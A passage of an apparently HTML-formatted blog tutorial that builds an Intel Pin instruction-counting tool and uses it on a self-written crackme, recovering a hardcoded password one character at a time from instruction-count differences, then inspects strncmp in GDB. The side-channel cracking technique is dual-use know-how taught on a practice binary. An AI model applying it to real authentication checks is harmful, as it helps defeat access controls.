&lt;span style=&#34;color: #586E75&#34;&gt;THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;END_LEGAL */&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;quot;pin.H&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// modified version of /pintool/source/tools/ManualExamples/inscount0.cpp&lt;/span&gt;


&lt;span style=&#34;color: #586E75&#34;&gt;// The running count of instructions is kept here&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;// make it static to help the compiler optimize docount&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;UINT64&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;icount&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// This function is called before every instruction is executed&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;// increase the count every time it is called, which is before every instruction&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;VOID&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;docount&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;icount&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
    
&lt;span style=&#34;color: #586E75&#34;&gt;// Pin calls this function every time a new instruction is encountered&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;VOID&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Instruction&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(INS&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ins,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;VOID&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;v)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// Insert a call to docount before every instruction, no arguments are passed&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// ins: instruction about to be executed&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// IPOINT_BEFORE: call is placed before each instruction&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// (AFUNPTR)docount: name of the function to call before every instruction&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// If any arguments are to be passed to the called function, they will be placed here&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// IARG_END: indicates the end of arguments&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;// as a result before each instruction, docount is called&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;INS_InsertCall(ins,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;IPOINT_BEFORE,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(AFUNPTR)docount,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;IARG_END);&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// This function is called when the application exits&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;VOID&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Fini&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(INT32&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;code,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;VOID&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;v)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// print the number of executed instructions&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;cout&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Count: &amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;icount&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;endl;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;/* ===================================================================== */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/* Print Help Message                                                    */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/* ===================================================================== */&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;INT32&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Usage&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;cout&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;This tool counts the number of dynamic instructions executed&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;endl;&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;/* ===================================================================== */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/* Main                                                                  */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/* ===================================================================== */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/*   argc, argv are the entire command line: pin -t &amp;lt;toolname&amp;gt; -- ...    */&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;/* ===================================================================== */&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;argv[])&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;// Initialize pin&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(PIN_Init(argc,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;argv))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Usage();&lt;/span&gt;

    &lt;span style=&#34;color: #586E75&#34;&gt;// Register Instruction to be called to instrument instructions&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;INS_AddInstrumentFunction(Instruction,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #586E75&#34;&gt;// Register Fini to be called when the application exits&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;PIN_AddFiniFunction(Fini,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;// Start the program, never returns&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;PIN_StartProgram();&lt;/span&gt;
    
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;To compile it, we can use the provided makefile. In ManualExamples run &lt;code&gt;make obj-ia32/myins.so&lt;/code&gt;. Note the filename and path. If everything works correctly, we will have &lt;code&gt;myins.so&lt;/code&gt;. Let&amp;rsquo;s copy it to where we want to write our example program.&lt;/p&gt;

&lt;h3 id=&#34;crackme-1-example-c-program:9d811092ed4116aee3518f2598b86e0b&#34;&gt;Crackme 1 - Example C Program&lt;/h3&gt;

&lt;p&gt;The program is quite simple, it checks the first argument against the hardcoded value &lt;code&gt;7bc3a60fbf38e98f6fef654afa26d270&lt;/code&gt;. We will use this program to test our Pin tool.



    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;crkme1.c&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&lt;/span&gt;

&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;argv)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;argc&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;usage: ./crkme1 code&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  
  &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;code[]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;7bc3a60fbf38e98f6fef654afa26d270&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  
  &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;strncmp(argv[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],code,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Correct&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Wrong&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Remember to use the &lt;code&gt;ggdb&lt;/code&gt; option to compile with debug information (for GDB). From what I understand this is very similar to the &lt;code&gt;g&lt;/code&gt; option. We will be using GDB to dive into the binary to observe strncmp&amp;rsquo;s behavior. Let&amp;rsquo;s use &lt;code&gt;gcc -ggdb -o crkme1 crkme1.c&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;using-pin-with-crkme1:9d811092ed4116aee3518f2598b86e0b&#34;&gt;Using Pin with Crkme1&lt;/h3&gt;

&lt;p&gt;To run our Pin tool against any executable execute &lt;code&gt;pin -t myins.so -- ./crkme1 012345&lt;/code&gt;. Now let&amp;rsquo;s experiment with some input. Our super secret code starts with &lt;code&gt;7b&lt;/code&gt; so I will be &lt;code&gt;fuzzing&lt;/code&gt; (for very simplistic definition of fuzzing) the first character and look at the number of executed instructions.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Changing first character&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ pin -t myins.so -- ./crkme1 1zzz
Wrong
Count: 100013
$ pin -t myins.so -- ./crkme1 5zzz
Wrong
Count: 100013
$ pin -t myins.so -- ./crkme1 7zzz
Wrong
Count: &lt;span style=&#34;color: #2AA198&#34;&gt;100015&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;# interesting&lt;/span&gt;
$ pin -t myins.so -- ./crkme1 bzzz
Wrong
Count: 100013
$pin -t myins.so -- ./crkme1 @zzz
Wrong
Count: 100013
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Notice a pattern? Seems like we executed two extra instructions when our first character matched. Assuming our theory is correct and we have the first character &lt;code&gt;7&lt;/code&gt;, let&amp;rsquo;s experiment with the second character.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Changing second character&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ pin -t myins.so -- ./crkme1 71zz
Wrong
Count: 100015
$ pin -t myins.so -- ./crkme1 75zz
Wrong
Count: 100015
$ pin -t myins.so -- ./crkme1 7bzz
Wrong
Count: &lt;span style=&#34;color: #2AA198&#34;&gt;100017&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;# 2 extra instructions executed&lt;/span&gt;
$ pin -t myins.so -- ./crkme1 7@zz
Wrong
Count: 100015
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;At this point you probably have a good idea why this is happening. But let&amp;rsquo;s look at the assembly code.&lt;/p&gt;

&lt;h3 id=&#34;gdb-and-strncmp:9d811092ed4116aee3518f2598b86e0b&#34;&gt;GDB and strncmp&lt;/h3&gt;

&lt;p&gt;Good thing we compiled our binary with debug information. Let&amp;rsquo;s look at the assembly code for strncmp:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Running crkme1 in gdb&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# q starts gdb in quiet mode&lt;/span&gt;
$ gdb ./crkme1 -q
Reading symbols from /root/Desktop/kek/crkme1...done.
&lt;span style=&#34;color: #586E75&#34;&gt;# putting a break on strncmp, this is possible because we compiled with -ggdb option&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;break&lt;/span&gt; strncmp
Breakpoint &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; at 0x8048350
&lt;span style=&#34;color: #586E75&#34;&gt;# passing 7bzz as a run-time argument. r stands for run&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; r 7bzz
Starting program: /root/Desktop/kek/crkme1 7bzz

Breakpoint 1, 0xb7f82b80 in ?? &lt;span style=&#34;color: #719e07&#34;&gt;()&lt;/span&gt; from /lib/i386-linux-gnu/i686/cmov/libc.so.6
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; disass
No &lt;span style=&#34;color: #719e07&#34;&gt;function&lt;/span&gt; contains program counter &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; selected frame.
&lt;span style=&#34;color: #586E75&#34;&gt;# oops what happened here?&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;To get a better a picture of the problem, we&amp;rsquo;re going to go through the same process in verbose mode in GDB using the &lt;code&gt;set verbose on&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Running in gdb with verbose on&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ gdb ./crkme1 -q
Reading symbols from /root/Desktop/kek/crkme1...done.
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;set&lt;/span&gt; verbose on
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;break&lt;/span&gt; strncmp
Breakpoint &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; at 0x8048350
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; r 7bzz
Starting program: /root/Desktop/kek/crkme1 7bzz
Reading symbols from /lib/ld-linux.so.2...&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;...done.
Loaded symbols &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; /lib/ld-linux.so.2
Reading symbols from system-supplied DSO at 0xb7fe1000...&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;...done.
&lt;span style=&#34;color: #586E75&#34;&gt;# aha, no debugging symbols found for libc6&lt;/span&gt;
Reading symbols from /lib/i386-linux-gnu/i686/cmov/libc.so.6...&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;...done.
Loaded symbols &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6

Breakpoint 1, 0xb7f82b80 in ?? &lt;span style=&#34;color: #719e07&#34;&gt;()&lt;/span&gt; from /lib/i386-linux-gnu/i686/cmov/libc.so.6
&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; disass
No &lt;span style=&#34;color: #719e07&#34;&gt;function&lt;/span&gt; contains program counter &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; selected frame.
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;According to line 12, we we need the debugging symbols for libc to look inside the code.
On Kali use &lt;code&gt;apt-get install libc6-dbg&lt;/code&gt;. Here we go again:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;After installing libc6-dbg&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;root@kali:~/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek#&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;crkme1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;q&lt;/span&gt;
